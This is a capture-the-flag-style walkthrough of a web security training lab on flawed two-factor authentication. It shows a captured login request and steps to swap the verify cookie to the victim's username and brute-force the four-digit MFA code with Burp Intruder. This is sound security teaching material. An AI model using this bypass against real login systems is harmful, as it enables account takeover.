---
tags:
  - authn
  - mfa
---
# 2FA broken logic

## Instructions

This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

You also have access to the email server to receive your 2FA verification code.

## Solution

When we log into our account and get the MFA code in the email client, we can see that the username is used to determine which account is being verified. 

```text title="Username used to verify" hl_lines="3"
POST /login2 HTTP/2
Host: 0a660055046432c782cebb6000900070.web-security-academy.net
Cookie: session=p9VYvqy3gpT5tuxmYocM1sDCWn6iMS3T; verify=wiener
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: https://0a660055046432c782cebb6000900070.web-security-academy.net
Referer: https://0a660055046432c782cebb6000900070.web-security-academy.net/login2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

mfa-code=0000
```

To solve the lab, send the `GET /login2` request to repeater, and change the verify parameter to `carlos`. This will generate an MFA code for carlos. 

Then, log in with our credentials, but submit an invalid MFA code. Send the previously submitted `POST /login2` request to intruder and add a placeholder on the mfa-code value. Be sure to change the verify value to carlos before sending.

Set the intruder to sniper and the payload to numbers 0000-9999. Look for the 302 status code. Once you have that, right click and select view in browser. 

Paste the generated URL into your browser and you will be dropped into carlos' account page. 